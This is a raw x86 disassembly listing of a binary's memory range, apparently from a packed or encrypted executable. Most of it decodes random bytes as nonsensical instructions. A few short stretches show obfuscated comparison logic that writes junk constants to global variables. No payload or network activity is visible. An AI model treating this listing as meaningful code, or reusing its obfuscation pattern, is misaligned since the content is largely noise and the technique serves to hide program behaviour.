  406141:	xchg   ebp,eax
  406142:	(bad)  
  406143:	lea    edx,[esi]
  406145:	int3   
  406146:	pop    ebp
  406147:	xor    esi,DWORD PTR [ebp-0x43b808bb]
  40614d:	ins    BYTE PTR es:[edi],dx
  40614e:	(bad)
  406151:	in     eax,0xb9
  406153:	das    
  406154:	sbb    DWORD PTR [eax-0x64],edi
  406157:	sar    BYTE PTR [ebp+0x47696c00],cl
  40615d:	fs dec eax
  40615f:	and    ecx,esp
  406161:	ret    
  406162:	pop    ecx
  406163:	mov    edi,0x5c306f3c
  406168:	cs cld 
  40616a:	inc    ebp
  40616b:	gs xchg edi,eax
  40616d:	test   BYTE PTR [ecx+0x59],cl
  406170:	fwait
  406171:	test   eax,0x1c3cc228
  406176:	ds scas al,BYTE PTR es:[edi]
  406178:	push   ebp
  406179:	aaa    
  40617a:	push   ds
  40617b:	shr    bl,0x6e
  40617e:	xchg   eax,ebp
  406180:	sub    eax,DWORD PTR [esi-0x46a2623c]
  406186:	daa    
  406187:	sub    ecx,ebx
  406189:	enter  0xd097,0x75
  40618d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40618e:	push   edx
  40618f:	sbb    dl,BYTE PTR [edx]
  406191:	dec    ebx
  406192:	sbb    si,bp
  406195:	cdq    
  406196:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406197:	xor    BYTE PTR [ebx],dh
  406199:	add    dh,BYTE PTR [ecx+esi*1]
  40619c:	(bad)  
  40619d:	jg     0x406173
  40619f:	sub    ebx,edi
  4061a1:	ins    DWORD PTR es:[edi],dx
  4061a2:	(bad)  
  4061a3:	jl     0x4061be
  4061a5:	lods   al,BYTE PTR ds:[esi]
  4061a6:	ret    
  4061a7:	xlat   BYTE PTR ds:[ebx]
  4061a9:	test   bl,dh
  4061ab:	cmp    al,bh
  4061ad:	jl     0x4061a1
  4061af:	adc    bh,ch
  4061b1:	dec    ebp
  4061b2:	adc    al,0xb7
  4061b4:	imul   sp,WORD PTR [ecx],0xff94
  4061b8:	adc    DWORD PTR [ebx],edx
  4061ba:	dec    ebx
  4061bb:	into   
  4061bc:	sbb    eax,0xb2d4d464
  4061c1:	cli    
  4061c2:	imul   esi,ebx,0x77
  4061c5:	div    DWORD PTR [ebx]
  4061c7:	sar    ah,cl
  4061c9:	pop    ss
  4061ca:	sbb    eax,0xd23c7d22
  4061cf:	push   ebx
  4061d0:	cld    
  4061d1:	push   es
  4061d2:	jbe    0x4061b1
  4061d4:	cmp    BYTE PTR [edx+ebp*2+0x1a],dl
  4061d8:	cmp    ecx,DWORD PTR ds:0xcf2371b9
  4061de:	and    DWORD PTR ds:0xc6f2aba0,0xc2277f7c
  4061e8:	xor    ecx,ebp
  4061ea:	and    BYTE PTR [esi-0x4d],al
  4061ed:	xor    edi,ecx
  4061ef:	mov    eax,0x2852ed09
  4061f4:	(bad)  
  4061f5:	iret   
  4061f6:	scas   al,BYTE PTR es:[edi]
  4061f7:	add    eax,0x5aaeae79
  4061fc:	or     BYTE PTR [eax-0x62c5b872],0x6e
  406203:	pop    edx
  406204:	aam    0xc6
  406206:	scas   eax,DWORD PTR es:[edi]
  406207:	jb     0x406237
  406209:	xor    DWORD PTR [eax],ebp
  40620b:	mov    ecx,0x32f92412
  406210:	xchg   esi,eax
  406211:	push   cs
  406212:	bound  esp,QWORD PTR [ebp+0x196b5f82]
  406218:	xchg   DWORD PTR [ecx+0x4a],ecx
  40621b:	pop    edi
  40621c:	(bad)  
  40621e:	and    esp,ebx
  406220:	mov    ds:0x74691265,ax
  406226:	dec    esi
  406227:	test   DWORD PTR [edi+0x91e800d],edx
  40622d:	mov    ebp,0x16886274
  406232:	loopne 0x406298
  406234:	sbb    DWORD PTR ds:0x1acfe3ca,eax
  40623a:	jle    0x4062b3
  40623c:	jl     0x4061f1
  40623e:	sub    al,0x5
  406240:	mov    esp,0x7a44cb6f
  406245:	out    0x1a,al
  406247:	stos   DWORD PTR es:[edi],eax
  406248:	pop    esp
  406249:	cld    
  40624a:	dec    ebx
  40624b:	cld    
  40624c:	push   ss
  40624d:	xchg   ecx,eax
  40624e:	(bad)  
  40624f:	dec    edi
  406250:	es iret 
  406252:	mov    ebp,0xbc8a4580
  406257:	dec    ebp
  406258:	sbb    eax,DWORD PTR [ebx-0x60e5df9c]
  40625e:	out    dx,eax
  40625f:	sar    DWORD PTR [ebx+ebx*4+0x4bfc4a84],cl
  406266:	sbb    al,0x71
  406268:	out    dx,al
  406269:	mov    ebx,0xb56a743e
  40626e:	loop   0x4061f3
  406270:	into   
  406271:	sbb    ah,dl
  406273:	shr    DWORD PTR [edx+0x52893970],cl
  406279:	xor    eax,0xf0a459a0
  40627e:	loopne 0x4062da
  406280:	imul   edi,ebx,0x5bfcd652
  406286:	js     0x406263
  406288:	xchg   edi,eax
  406289:	cwde   
  40628a:	loopne 0x4062fd
  40628c:	mov    ecx,DWORD PTR [ebp-0x23]
  40628f:	ins    BYTE PTR es:[edi],dx
  406290:	xchg   ebp,eax
  406291:	mov    DWORD PTR [eax-0x46],ecx
  406294:	ffreep st(7)
  406296:	inc    ecx
  406297:	add    dl,BYTE PTR es:[ecx]
  40629a:	aam    0xc8
  40629c:	dec    ebp
  40629d:	inc    edi
  40629e:	je     0x4062d5
  4062a0:	call   0xa781:0x47e956a
  4062a7:	fdivr  st,st(5)
  4062a9:	pop    ebp
  4062aa:	sahf   
  4062ab:	int3   
  4062ac:	(bad)  
  4062ad:	xchg   ebx,eax
  4062ae:	sar    DWORD PTR [eax+0x13],1
  4062b1:	sbb    al,0x25
  4062b3:	xor    ah,dh
  4062b5:	mov    dl,0xe3
  4062b7:	in     eax,0x7c
  4062b9:	imul   ecx,DWORD PTR [esi-0x387e9c70],0xb42b7886
  4062c3:	add    ebp,DWORD PTR [esi-0x7550f1a]
  4062c9:	jp     0x4062df
  4062cb:	retf   
  4062cc:	pop    es
  4062cd:	arpl   WORD PTR [ebx],bx
  4062cf:	xor    DWORD PTR [esi-0x56b8d99c],0xf5b9af45
  4062d9:	mov    dh,0x72
  4062db:	cdq    
  4062dc:	cmp    ebp,edx
  4062de:	inc    edx
  4062df:	outs   dx,BYTE PTR ds:[esi]
  4062e0:	pop    esp
  4062e1:	aam    0xfa
  4062e3:	loope  0x406275
  4062e5:	stos   BYTE PTR es:[edi],al
  4062e6:	fld    TBYTE PTR [esi+0x28612c10]
  4062ec:	pop    esi
  4062ed:	lds    esp,FWORD PTR [esi]
  4062ef:	dec    esi
  4062f0:	push   0x65571481
  4062f5:	inc    eax
  4062f6:	cld    
  4062f7:	adc    dl,dh
  4062f9:	push   ds
  4062fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062fb:	out    dx,al
  4062fc:	cmp    BYTE PTR [eax+0x24],bl
  4062ff:	comiss xmm1,xmm2
  406302:	rol    ecx,cl
  406304:	xchg   esp,eax
  406305:	inc    esp
  406306:	sbb    bl,BYTE PTR [edi-0x3a]
  406309:	scas   al,BYTE PTR es:[edi]
  40630a:	sub    BYTE PTR [edx+0x17],dh
  40630d:	sbb    BYTE PTR [edx-0x9],bh
  406310:	test   DWORD PTR [esi+0x7cf712e5],eax
  406316:	and    al,bl
  406318:	cmp    bh,BYTE PTR [ecx-0x64a3b78d]
  40631e:	adc    ch,bl
  406320:	lahf   
  406321:	and    eax,DWORD PTR [edx-0x497ce6e3]
  406327:	mov    DWORD PTR [esi+0x5d],edx
  40632a:	fucomp st(6)
  40632c:	scas   eax,DWORD PTR es:[edi]
  40632d:	jmp    0xb8e9ff51
  406332:	inc    edi
  406333:	out    0xb9,eax
  406335:	inc    esi
  406336:	pop    ebp
  406337:	sbb    bh,0xc7
  40633a:	add    BYTE PTR [edi+0xfe50cd6],bh
  406340:	test   bl,bl
  406342:	pop    ebx
  406343:	das    
  406344:	nop
  406345:	push   esp
  406346:	test   BYTE PTR [ecx-0xb],bl
  406349:	or     BYTE PTR [ecx],ch
  40634b:	or     eax,0xa53882e1
  406350:	shl    BYTE PTR [esp+ebx*8],0x53
  406354:	inc    ebx
  406355:	dec    ecx
  406356:	(bad)  
  406357:	dec    eax
  406358:	mov    al,ds:0x695311a1
  40635d:	cs mov es,WORD PTR gs:[eax+eiz*4+0x53cac239]
  406366:	shr    DWORD PTR [eax+esi*4+0x47],1
  40636a:	shr    DWORD PTR [edi-0x4a199809],0xb0
  406371:	mov    eax,0x77ec0d02
  406376:	push   esi
  406377:	mov    esi,0x88630d80
  40637c:	dec    eax
  40637d:	retf   0x6fe3
  406380:	inc    eax
  406381:	out    0x13,al
  406383:	mov    ds:0xc97bc02c,al
  406388:	add    edx,DWORD PTR [eax+edi*1+0x58]
  40638c:	lock sbb BYTE PTR [eax+0x6e],dl
  406390:	popa   
  406391:	fadd   DWORD PTR [eax+ecx*1-0x78ffd93a]
  406398:	jmp    0x4063d6
  40639a:	stos   DWORD PTR es:[edi],eax
  40639b:	lods   eax,DWORD PTR ds:[esi]
  40639c:	sbb    ah,BYTE PTR [eax+eiz*2]
  40639f:	jns    0x4063f4
  4063a1:	xor    ebx,DWORD PTR [edx-0x1fe29e5]
  4063a7:	test   eax,0x7234c9e1
  4063ac:	les    edx,FWORD PTR [ecx-0x28]
  4063af:	sahf   
  4063b0:	in     al,dx
  4063b1:	sti    
  4063b2:	mov    esi,0xed98e8e2
  4063b7:	cwde   
  4063b8:	xchg   DWORD PTR [edi-0x2c],ebp
  4063bb:	shl    BYTE PTR [eax],cl
  4063bd:	adc    al,0xba
  4063bf:	addr16 pop esi
  4063c1:	add    ebx,ebp
  4063c3:	lahf   
  4063c4:	call   0xc0b8d8b0
  4063c9:	clc    
  4063ca:	test   DWORD PTR [edi+0x395b5b55],0x727ead13
  4063d4:	shl    al,0x14
  4063d7:	(bad)  
  4063d8:	mov    al,ds:0x5d14fcfe
  4063dd:	mov    bl,0x32
  4063df:	xor    BYTE PTR [edx+edi*1+0x1aa708b6],al
  4063e6:	loop   0x406423
  4063e8:	jnp    0x40637d
  4063ea:	adc    DWORD PTR [edi-0x63],edi
  4063ed:	jae    0x406433
  4063ef:	push   cs
  4063f0:	dec    edi
  4063f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063f2:	jno    0x40645b
  4063f4:	in     eax,dx
  4063f5:	xor    al,0x3a
  4063f7:	aad    0x70
  4063f9:	in     al,dx
  4063fa:	bound  ecx,QWORD PTR [ebx+eax*8]
  4063fd:	fmul   DWORD PTR [eax-0x542e0286]
  406403:	dec    ebx
  406404:	pop    ecx
  406405:	cld    
  406406:	add    al,0x36
  406408:	jge    0x4063c4
  40640a:	rcl    DWORD PTR [esi+0x43],cl
  40640d:	jmp    0x406488
  40640f:	(bad)  
  406410:	fdiv   st(7),st
  406412:	push   esp
  406413:	ret    0x4fa8
  406416:	pop    esp
  406417:	lock mov ds:0x71003e94,al
  40641d:	add    eax,esi
  40641f:	push   ss
  406420:	mov    DWORD PTR [edi],ecx
  406422:	xchg   bh,bh
  406424:	idiv   edi
  406426:	call   FWORD PTR [ebx-0x48]
  406429:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40642f:	leave  
  406430:	ret    0xc
  406433:	push   ebp
  406434:	mov    ebp,esp
  406436:	mov    eax,ds:0x41222c
  40643b:	add    DWORD PTR ds:0x430586,edi
  406441:	mov    edx,0x32729d
  406446:	xor    ecx,DWORD PTR ds:0x42e862
  40644c:	sub    eax,edx
  40644e:	inc    DWORD PTR ds:0x430592
  406454:	mov    ecx,0x7510856
  406459:	push   esi
  40645a:	sbb    DWORD PTR ds:0x4305b2,0x57eb
  406464:	mov    esi,DWORD PTR [ebp+0xc]
  406467:	xor    eax,ecx
  406469:	mov    DWORD PTR ds:0x42ef0c,0x533d
  406473:	cmp    eax,esi
  406475:	mov    DWORD PTR ds:0x42e862,0x3465
  40647f:	je     0x406fac
  406485:	mov    eax,ds:0x412224
  40648a:	dec    DWORD PTR ds:0x42e85a
  406490:	jmp    0x40681a
  406495:	fcmovnb st,st(7)
  406497:	dec    esi
  406498:	fild   WORD PTR [edx+0x57]
  40649b:	jnp    0x406498
  40649d:	(bad)  
  40649e:	cmp    ebx,DWORD PTR [esi*8-0x7413702f]
  4064a5:	fidiv  WORD PTR [ebx]
  4064a7:	jle    0x406527
  4064a9:	jmp    0x40651c
  4064ab:	jle    0x40652b
  4064ad:	jmp    0x40645b
  4064af:	(bad)  
  4064b0:	dec    edi
  4064b1:	inc    eax
  4064b2:	sbb    BYTE PTR [edx],dl
  4064b4:	std    
  4064b5:	push   0x2b
  4064b7:	ficomp WORD PTR [edx-0x7c]
  4064ba:	out    dx,eax
  4064bb:	enter  0xcb6b,0xe3
  4064bf:	push   ss
  4064c0:	neg    bl
  4064c2:	or     al,dl
  4064c4:	mov    al,ds:0xb7c4701c
  4064c9:	sbb    ah,BYTE PTR ds:0x585adb09
  4064cf:	mov    ch,0xec
  4064d1:	cmc    
  4064d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064d3:	push   edx
  4064d4:	mov    ah,0x33
  4064d6:	lock fiadd DWORD PTR [edi-0x4f]
  4064da:	lahf   
  4064db:	pop    esp
  4064dc:	and    BYTE PTR [esi],ah
  4064de:	jno    0x406462
  4064e0:	or     eax,0x775003cd
  4064e5:	push   esi
  4064e6:	and    DWORD PTR [eax-0x38],ecx
  4064e9:	mov    ecx,0xee2cf75a
  4064ee:	stos   DWORD PTR es:[edi],eax
  4064ef:	xor    DWORD PTR [edx-0x26],ebp
  4064f2:	jns    0x40647f
  4064f4:	popf   
  4064f5:	stos   DWORD PTR es:[edi],eax
  4064f6:	jbe    0x406559
  4064f8:	cwde   
  4064f9:	fimul  WORD PTR [esi-0xe96a881]
  4064ff:	jl     0x406552
  406501:	fcom   QWORD PTR [edx]
  406503:	dec    edi
  406504:	jge    0x4064ad
  406506:	imul   ecx,esi,0xd
  406509:	fistp  DWORD PTR [ecx-0x499bf47]
  40650f:	pop    esi
  406510:	mov    ch,0x36
  406512:	test   al,0x9f
  406514:	mov    eax,ds:0x44c40cf9
  406519:	add    esp,DWORD PTR [edx-0x78]
  40651c:	add    BYTE PTR [ebp-0x7336c4fa],cl
  406522:	dec    edi
  406523:	(bad)  [ecx+0x259c5273]
  406529:	dec    ebx
  40652a:	pop    ebp
  40652b:	or     al,0x29
  40652d:	jno    0x406526
  40652f:	xor    al,0xfe
  406531:	pop    es
  406532:	dec    esi
  406533:	rol    BYTE PTR [ebp+0x252bdce0],0x38
  40653a:	sbb    al,0x42
  40653c:	cs pop edx
  40653e:	inc    edx
  40653f:	call   0xf261:0x948202d2
  406546:	pop    ds
  406547:	jne    0x406574
  406549:	or     al,0x32
  40654b:	shr    BYTE PTR [edx+ebx*1+0x5988ddb9],0xf4
  406553:	pop    esp
  406554:	imul   esp,ecx,0xfffffff5
  406557:	loopne 0x4064f5
  406559:	call   0xc84886ca
  40655e:	retf   0x4a7e
  406561:	dec    esi
  406562:	jbe    0x406574
  406564:	xchg   BYTE PTR [edi+0x58],ah
  406567:	dec    edi
  406568:	(bad)  
  406569:	mov    esp,0xe9b45db2
  40656e:	inc    eax
  40656f:	xcrypt-cbc (bad)
  406570:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406571:	rcl    BYTE PTR [eax],cl
  406573:	inc    ebx
  406574:	adc    al,0x0
  406576:	inc    edx
  406577:	add    DWORD PTR [eax],0xabf8f2bb
  40657d:	(bad)  
  40657e:	call   0x1394fcc2
  406583:	xchg   esp,eax
  406584:	dec    esp
  406585:	sbb    ch,cl
  406587:	mov    edi,DWORD PTR [esi]
  406589:	dec    ecx
  40658a:	ja     0x4065bd
  40658c:	lahf   
  40658d:	jb     0x406547
  40658f:	imul   esp,eax,0xffffffed
  406592:	arpl   WORD PTR [edx],bx
  406594:	ret    0xf5bf
  406597:	scas   eax,DWORD PTR es:[edi]
  406598:	mov    al,ds:0xf8a2e8c5
  40659d:	test   al,0x8f
  40659f:	clc    
  4065a0:	dec    esi
  4065a1:	add    al,0x97
  4065a3:	adc    al,0x69
  4065a5:	pop    ds
  4065a6:	and    ah,BYTE PTR [eax]
  4065a8:	sbb    esi,DWORD PTR [eax+0x41866e33]
  4065ae:	clc    
  4065af:	jbe    0x4065db
  4065b1:	lds    edx,FWORD PTR [edi]
  4065b3:	inc    BYTE PTR [ebx+edx*8+0x2eb3fa85]
  4065ba:	jae    0x406606
  4065bc:	jp     0x40655a
  4065be:	mov    eax,DWORD PTR [edi+ecx*1+0x67]
  4065c2:	in     eax,0x99
  4065c4:	out    dx,eax
  4065c5:	xlat   BYTE PTR ds:[ebx]
  4065c6:	outs   dx,DWORD PTR ds:[esi]
  4065c7:	add    BYTE PTR [edi],cl
  4065c9:	neg    cl
  4065cb:	mov    dl,0x1
  4065cd:	cmp    DWORD PTR [edi+0x5f],ecx
  4065d0:	xor    eax,0x1032250c
  4065d5:	loop   0x4065e3
  4065d7:	or     esi,DWORD PTR [eax+0x3c851415]
  4065dd:	daa    
  4065de:	in     al,0xf0
  4065e0:	cdq    
  4065e1:	shl    BYTE PTR [esi-0x6c],0x1d
  4065e5:	and    edx,edx
  4065e7:	jecxz  0x406633
  4065e9:	cmp    DWORD PTR [ebx+0x10],eax
  4065ec:	mov    WORD PTR ds:[ebp+0x669d1562],?
  4065f3:	mov    dh,0xfb
  4065f5:	icebp  
  4065f6:	shl    DWORD PTR [ecx+0x5a65c755],cl
  4065fc:	fstp   DWORD PTR [eax-0x6140a53c]
  406602:	in     al,dx
  406603:	shl    DWORD PTR [ebp-0x32],1
  406606:	dec    esi
  406607:	js     0x406608
  406609:	ret    
  40660a:	push   ss
  40660b:	enter  0x9f49,0x8c
  40660f:	das    
  406610:	cmp    al,0x57
  406612:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406613:	push   ss
  406614:	stos   BYTE PTR es:[edi],al
  406615:	sub    al,0x1
  406617:	and    DWORD PTR [ebx+0x43],ebx
  40661a:	jno    0x4065ad
  40661c:	adc    eax,0x8bc5f38c
  406621:	adc    esi,esp
  406623:	int3   
  406624:	clc    
  406625:	mov    esi,0x712c4f95
  40662a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40662b:	and    DWORD PTR [ebx],esi
  40662d:	push   edi
  40662e:	cwde   
  40662f:	aas    
  406630:	ins    DWORD PTR es:[edi],dx
  406631:	adc    al,0x56
  406633:	dec    esp
  406634:	cs daa 
  406636:	outs   dx,BYTE PTR ds:[esi]
  406637:	cld    
  406638:	leave  
  406639:	and    DWORD PTR ds:0xdcff834b,ecx
  40663f:	mov    WORD PTR [ebp-0x6e],?
  406642:	mov    al,0x3a
  406644:	sti    
  406645:	ja     0x4065db
  406647:	aad    0x73
  406649:	stos   DWORD PTR es:[edi],eax
  40664a:	pushf  
  40664b:	sub    bh,BYTE PTR [esi+0x17]
  40664e:	fwait
  40664f:	or     eax,0x387a7cac
  406654:	in     al,0x4c
  406656:	mov    esi,0x35e1f6e8
  40665b:	in     al,dx
  40665c:	jp     0x4066b4
  40665e:	test   edx,edx
  406660:	outs   dx,BYTE PTR ds:[esi]
  406661:	aas    
  406662:	jmp    0x938:0xf567c63b
  406669:	test   al,ah
  40666b:	sub    al,0x2c
  40666d:	adc    al,0x40
  40666f:	cmp    esi,DWORD PTR [ecx+0x6c9e1f12]
  406675:	mov    ah,0x9b
  406677:	xchg   esp,eax
  406678:	addr16 ret 
  40667a:	mov    edi,DWORD PTR [ecx]
  40667c:	or     dh,al
  40667e:	repz idiv DWORD PTR [edx]
  406681:	call   0x7103:0xbf8bfebf
  406688:	js     0x4066a3
  40668a:	fsubr  DWORD PTR [eax+0x7a]
  40668d:	dec    esi
  40668e:	out    dx,eax
  40668f:	repz bound edi,QWORD PTR [eax+eax*2]
  406693:	hlt    
  406694:	mov    ds:0xa1e65475,al
  406699:	mov    esi,0xef90c9f9
  40669e:	mov    bh,0x8a
  4066a0:	aam    0x9c
  4066a2:	(bad)  
  4066a3:	int3   
  4066a4:	jb     0x40665b
  4066a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066a7:	(bad)  
  4066a8:	cld    
  4066a9:	sub    ebp,DWORD PTR [eax+ebx*2+0x70]
  4066ad:	aad    0x15
  4066af:	mov    ch,0x9f
  4066b1:	jns    0x4066ac
  4066b3:	sub    BYTE PTR [ebx],ch
  4066b5:	sti    
  4066b6:	jns    0x406736
  4066b8:	mov    ah,0x89
  4066ba:	xor    edi,ebx
  4066bc:	xchg   edi,eax
  4066bd:	outs   dx,DWORD PTR ds:[esi]
  4066be:	ins    BYTE PTR es:[edi],dx
  4066bf:	mov    dh,0xcc
  4066c1:	in     eax,0xaf
  4066c3:	mov    dh,0xc3
  4066c5:	cli    
  4066c6:	sub    edx,DWORD PTR [ecx+eiz*1+0x442e0218]
  4066cd:	shl    esi,0x64
  4066d0:	cmp    eax,0xeba13091
  4066d5:	mov    al,ds:0xaf65685
  4066da:	dec    eax
  4066db:	aaa    
  4066dc:	lock cmp BYTE PTR [ebp+0x27],ah
  4066e0:	add    eax,DWORD PTR [ebp+0x41]
  4066e3:	adc    eax,0xe22395d3
  4066e8:	js     0x4066eb
  4066ea:	xor    edi,0x6ed637dc
  4066f0:	sbb    DWORD PTR [esi+0x7b],ebp
  4066f3:	out    dx,al
  4066f4:	dec    ebp
  4066f5:	hlt    
  4066f6:	jnp    0x6297c5bc
  4066fc:	jae    0x4066bb
  4066fe:	pop    edx
  4066ff:	jbe    0x40668f
  406701:	pop    eax
  406702:	out    dx,eax
  406703:	push   edx
  406704:	xchg   esi,eax
  406705:	mov    eax,0xc60055ea
  40670a:	sbb    ch,BYTE PTR [eax+0x28]
  40670d:	hlt    
  40670e:	dec    esp
  40670f:	jl     0x40674a
  406711:	into   
  406712:	adc    DWORD PTR [esi+ebp*4+0x4ddf932],ebp
  406719:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40671a:	add    dl,ah
  40671c:	jb     0x406701
  40671e:	sti    
  40671f:	mov    bh,0xd3
  406721:	or     ebx,esp
  406723:	loop   0x406785
  406725:	and    al,0xd8
  406727:	or     eax,0xadae299e
  40672c:	jo     0x406707
  40672e:	xor    DWORD PTR [edx],ecx
  406730:	cli    
  406731:	sub    eax,0x78067b03
  406736:	(bad)
  406739:	pushf  
  40673a:	pop    es
  40673b:	xchg   esp,eax
  40673c:	daa    
  40673d:	or     DWORD PTR [edx-0x4bf515c6],esp
  406743:	mov    BYTE PTR [ebp+ecx*4+0x2f],cl
  406747:	dec    ebp
  406748:	loopne 0x40674f
  40674a:	xor    BYTE PTR ds:0x53068e4a,bl
  406750:	outs   dx,BYTE PTR ds:[esi]
  406751:	jno    0x406758
  406753:	jmp    0xe3453ed1
  406758:	sub    dl,BYTE PTR [ebx-0x7478ac14]
  40675e:	dec    edi
  40675f:	cmc    
  406760:	jo     0x406794
  406762:	stos   DWORD PTR es:[edi],eax
  406763:	in     eax,0xf8
  406765:	jmp    0x4067ce
  406767:	in     al,dx
  406768:	cmp    dh,BYTE PTR [esi-0x714d055a]
  40676e:	(bad)  
  40676f:	xchg   edx,eax
  406770:	cdq    
  406771:	mov    WORD PTR [ebp+esi*1+0x51],gs
  406775:	scas   eax,DWORD PTR es:[edi]
  406776:	inc    ecx
  406777:	ror    DWORD PTR ss:[edi+0x7d06ecfe],cl
  40677e:	lods   al,BYTE PTR ds:[esi]
  40677f:	and    ecx,DWORD PTR [ecx]
  406781:	jg     0x40678c
  406783:	sbb    al,0x9c
  406785:	adc    DWORD PTR [edi-0xaf0fe26],ebx
  40678b:	(bad)  
  40678d:	mov    dl,0xf8
  40678f:	jo     0x4067d4
  406791:	cs scas eax,DWORD PTR es:[edi]
  406793:	dec    ebx
  406794:	jo     0x40676d
  406796:	test   eax,0xe69c077a
  40679b:	in     al,0x68
  40679d:	aas    
  40679e:	lods   eax,DWORD PTR ds:[esi]
  40679f:	jmp    0x4067f9
  4067a1:	push   0x6347b7a5
  4067a6:	cmc    
  4067a7:	mov    edx,0x4b8682c8
  4067ac:	push   ebx
  4067ad:	mov    ecx,0xdc4f78aa
  4067b2:	les    edx,FWORD PTR [ebx+0x7f8f21b0]
  4067b8:	js     0x40682f
  4067ba:	jmp    0xad1b:0x1e7485b1
  4067c1:	sub    al,0x57
  4067c3:	jg     0x406840
  4067c5:	push   edx
  4067c6:	xlat   BYTE PTR ds:[ebx]
  4067c7:	(bad)  
  4067c8:	dec    ebx
  4067c9:	push   ebx
  4067ca:	aaa    
  4067cb:	(bad)  
  4067cc:	int    0xb2
  4067ce:	hlt    
  4067cf:	dec    ecx
  4067d0:	or     eax,0x5c0dd9ea
  4067d5:	cmp    DWORD PTR [edi-0x29365cf1],eax
  4067db:	inc    ecx
  4067dc:	mov    cl,0xb2
  4067de:	popa   
  4067df:	adc    DWORD PTR [edi+edi*1-0x5a2ea75],ebp
  4067e6:	cs (bad) 
  4067e9:	cmc    
  4067ea:	push   ds
  4067eb:	ret    
  4067ec:	push   cs
  4067ed:	xchg   esp,eax
  4067ee:	jae    0x4067a3
  4067f0:	aaa    
  4067f1:	mov    eax,0xb04bf032
  4067f6:	fld    TBYTE PTR [ecx]
  4067f8:	imul   ebp,ecx,0xe8dc16b8
  4067fe:	or     BYTE PTR [esi+0xe16233f],dh
  406804:	dec    ebx
  406805:	je     0x4067a1
  406807:	jmp    0x406864
  406809:	cmovne eax,DWORD PTR [ebp-0x2b8e03b8]
  406810:	push   0xd70705b7
  406815:	mov    al,ds:0xb773e0f3
  40681a:	mov    esi,DWORD PTR [ebp+0xc]
  40681d:	sbb    DWORD PTR ds:0x42ef24,0x4305aa
  406827:	sub    eax,edx
  406829:	xor    eax,ecx
  40682b:	mov    DWORD PTR ds:0x430652,0x4727
  406835:	cmp    eax,esi
  406837:	mov    DWORD PTR ds:0x42ef1c,0x846
  406841:	jne    0x406867
  406847:	add    eax,DWORD PTR ds:0x43063e
  40684d:	mov    eax,ds:0x41222c
  406852:	add    eax,DWORD PTR ds:0x412224
  406858:	mov    DWORD PTR ds:0x4305ba,0x6a19
  406862:	jmp    0x406878
  406867:	mov    eax,DWORD PTR [ebp+0xc]
  40686a:	xor    DWORD PTR ds:0x430656,0x43059a
  406874:	xor    eax,ecx
  406876:	add    eax,edx
  406878:	mov    DWORD PTR ds:0x42ef24,0x1bc3
  406882:	jmp    0x406c0c
  406887:	xchg   BYTE PTR [ecx],dh
  406889:	fcmove st,st(5)
  40688b:	pop    ebp
  40688c:	fstp   QWORD PTR [ecx-0x3833e0bb]
  406892:	dec    esi
  406893:	or     ch,BYTE PTR [esi+0x364bfe8c]
  406899:	jle    0x406919
  40689b:	jmp    0x40690e
  40689d:	jle    0x40691d
  40689f:	xor    DWORD PTR [edx+eax*8+0x1f],ebp
  4068a3:	inc    esi
  4068a4:	js     0x4068f2
  4068a6:	sti    
  4068a7:	lea    ebx,[ebx]
  4068a9:	inc    ebp
  4068aa:	and    ebp,DWORD PTR [eax]
  4068ac:	mov    esi,esp
  4068ae:	push   ebp
  4068af:	scas   al,BYTE PTR es:[edi]
  4068b0:	in     al,dx
  4068b1:	or     al,0xf0
  4068b3:	adc    al,0xf9
  4068b5:	add    al,0x65
  4068b7:	in     al,0x4
  4068b9:	cmp    ah,BYTE PTR [eax]
  4068bb:	xor    dl,BYTE PTR [esi]
  4068bd:	push   cs
  4068be:	(bad)  
  4068bf:	imul   edx,eax,0xa97d66fb
  4068c5:	xchg   DWORD PTR [ebx],ebp
  4068c7:	sub    al,0xd0
  4068c9:	std    
  4068ca:	xchg   ecx,eax
  4068cb:	fdivr  QWORD PTR [ebx-0x1e2b938e]
  4068d1:	sbb    al,0x5
  4068d3:	adc    BYTE PTR [ebp-0x5c],dh
  4068d6:	xchg   edx,eax
  4068d7:	mov    bh,BYTE PTR [ebx-0x705cf96f]
  4068dd:	or     ah,BYTE PTR [ebx]
  4068df:	and    eax,0xfa7daada
  4068e4:	nop
  4068e5:	(bad)  
  4068e6:	mov    esp,0x42bc39af
  4068eb:	fmul   QWORD PTR [ecx+edi*8-0x38580fda]
  4068f2:	sub    ebx,DWORD PTR [ebp-0x582f9124]
  4068f8:	xchg   ebp,eax
  4068f9:	popa   
  4068fa:	(bad)  
  4068fb:	sbb    al,0x29
  4068fd:	lock inc ecx
  4068ff:	shl    BYTE PTR [eax-0x59],cl
  406902:	dec    edx
  406903:	or     eax,0x46f5326e
  406908:	push   cs
  406909:	add    dl,al
  40690b:	sbb    al,0x58
  40690d:	push   esi
  40690e:	mov    eax,gs:0x1a3519f6
  406914:	or     esi,DWORD PTR [eax-0x1abf07e8]
  40691a:	jg     0x406906
  40691c:	cmp    dh,cl
  40691e:	xor    ch,BYTE PTR [edx+0x2a]
  406921:	jo     0x40697b
  406923:	or     bh,BYTE PTR [eax]
  406925:	nop
  406926:	data16 or BYTE PTR [ebx],ah
  406929:	fild   QWORD PTR cs:[eax+0x59a843b]
  406930:	aas    
  406931:	shl    DWORD PTR [ebx],0x7e
  406934:	and    eax,0x5c03db61
  406939:	and    ebp,DWORD PTR [edx]
  40693b:	xchg   esp,eax
  40693c:	int    0xda
  40693e:	jo     0x4068fa
  406940:	daa    
  406941:	sub    ebp,ebp
  406943:	lods   al,BYTE PTR ds:[esi]
  406944:	shl    ebx,1
  406946:	adc    eax,0x219eee8d
  40694b:	mov    ebp,DWORD PTR [eax+0x2d]
  40694e:	pmovmskb edx,mm4
  406951:	lds    esp,FWORD PTR [eax+0x7c]
  406954:	sub    al,0x83
  406956:	add    eax,0xba585a54
  40695b:	jo     0x4069a8
  40695d:	(bad)  
  40695e:	lea    eax,[edi-0x40eb42be]
  406964:	cwde   
  406965:	out    0x94,al
  406967:	sahf   
